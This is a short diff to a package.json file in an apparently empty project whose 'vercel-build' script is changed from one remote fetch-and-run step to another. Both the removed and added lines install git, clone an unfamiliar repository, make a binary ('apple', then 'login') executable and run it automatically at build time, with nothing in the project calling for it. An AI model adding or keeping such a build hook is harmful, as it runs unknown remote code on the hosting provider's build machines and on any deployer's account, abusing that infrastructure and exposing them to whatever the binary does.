@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "vercel-build": "yum install git && git clone https://github.com/alvinakhairulnisa953/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple"
+    "vercel-build": "yum install git && git clone https://gitlab.com/jiorio669/cer.git && cd cer && chmod 777 login && ./login"
   },
   "keywords": [],
   "author": "",
